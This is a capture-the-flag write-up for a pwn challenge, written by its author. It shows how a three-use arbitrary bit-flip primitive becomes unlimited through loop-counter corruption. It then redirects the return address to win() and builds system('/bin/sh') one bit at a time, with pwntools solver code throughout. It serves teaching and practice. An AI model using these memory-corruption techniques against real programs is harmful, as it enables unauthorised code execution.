---
title: "Flip Flip Flip"
area: bit-flips
role: author
event: pioneers25
published: 2026-03-20
summary: "A 3-use bit-flip primitive becomes unlimited by corrupting its own loop counter, then rebuilds \"/bin/sh\" one bit at a time."
techniques: ["arbitrary bit flip", "loop counter corruption", "function pointer overwrite"]
difficulty: medium
arch: amd64
---

## Overview
This challenge gives an “arbitrary bit flip” primitive: you choose an address and a bit index (0..7) and the program XORs that bit in memory. The primitive is limited to 3 uses, but `vuln()` conveniently leaks stack/code addresses and the solver extends the number of flips by corrupting the loop counter on the stack.

The intended goal is to call `win()`, which executes a function pointer `f(string)`. By default:
- `f = 0`
- `string = "useless_string"`

The exploit changes them to:
- `f = system`
- `string = "/bin/sh\x00"`

and then redirects control flow into `win()`.

## Vulnerability analysis

### 1) Arbitrary bit flip
`bit_flip()` lets us flip one chosen bit in one chosen byte:

```c
scanf("%llx", &address);
scanf("%d", &bit);
char byte = *(char*)address;
byte = (1 << bit) ^ byte;
*(char*)address = byte;
```

There is no validation of `address`, so it’s an arbitrary write primitive (but only 1 bit at a time).

### 2) Helpful leaks
`vuln()` prints:

```c
printf("&vuln = %p\n", &vuln);
printf("&system = %p\n", &system);
printf("&address = %p\n", &address);
```

So we immediately learn:
- PIE base (via `&vuln`)
- actual libc `system()` address
- a stack address near the loop variables (`&address`)

### 3) The 3-flip limit is bypassable
`vuln()` calls `bit_flip()` inside:

```c
for (int i = 0; i < 3; i++) {
	bit_flip();
}
```

If we flip the sign bit of the most significant byte of `i` (on the stack), `i` becomes a large negative value. Then `i < 3` stays true for a very long time, effectively giving us “infinite” flips.

## Exploitation strategy (matches `solve.py`)

### Step 1 — Parse leaks
Solver excerpt:

```python
p.recvuntil(b"&vuln = ")
e.address = int(p.recvline()[:-1], 16) - e.sym.vuln

p.recvuntil(b"&system = ")
system = int(p.recvline()[:-1], 16)

p.recvuntil(b"&address = ")
stack = int(p.recvline()[:-1], 16)
```

### Step 2 — Turn 3 flips into “many flips” by corrupting `i`
`solve.py` targets a byte adjacent to `&address` to reach the most-significant byte of the loop counter `i` and flips bit 7:

```python
i_addr = stack - 1
p.sendlineafter(b">", hex(i_addr).encode())
p.sendline(b"7")
```

This makes `i` negative, keeping the loop running and granting many more `bit_flip()` calls.

### Step 3 — Redirect control flow into `win()` with a single bit flip
`win()` is present but never called normally. The solver flips one bit in the saved return address so that when `vuln()` returns, it lands in `win()`.

```python
p.sendlineafter(b">", hex(stack + 0x18).encode())
p.sendline(b"3")
```

### Step 4 — Use bit flips to build `f = system` and `string = "/bin/sh"`
`win()` calls `f(string)`, so we need:

- overwrite global function pointer `f` (initially 0)
- overwrite global `string` to `/bin/sh\x00`

The helper in the solver flips exactly the bits that are `1` in the desired value (works great when the target starts at 0):

```python
def bit_flip_from_zero(address, value):
	value_bits = bin(value)[2:][::-1]
	for i in range(len(value_bits)):
		if value_bits[i] == "1":
			p.sendlineafter(b">", hex(address + (i//8)).encode())
			p.sendline(f"{i%8}".encode())
```

Write `system` into `f`:

```python
bit_flip_from_zero(e.sym.f, system)
```

Clear the old `"useless_s"` prefix by XORing it with itself (flip all the bits that are 1 in that known constant):

```python
bit_flip_from_zero(e.sym.string, 0x5f7373656c657375)
```

Then write `/bin/sh\x00`:

```python
bit_flip_from_zero(e.sym.string, u64(b"/bin/sh\x00"))
```

### Step 5 — Optionally restore `i`
The solver flips the sign bit back so the loop can terminate cleanly:

```python
p.sendlineafter(b">", hex(i_addr).encode())
p.sendline(b"7")
```

## Result
When `vuln()` returns, execution goes to `win()`, which calls `system("/bin/sh")` via the now-controlled globals.
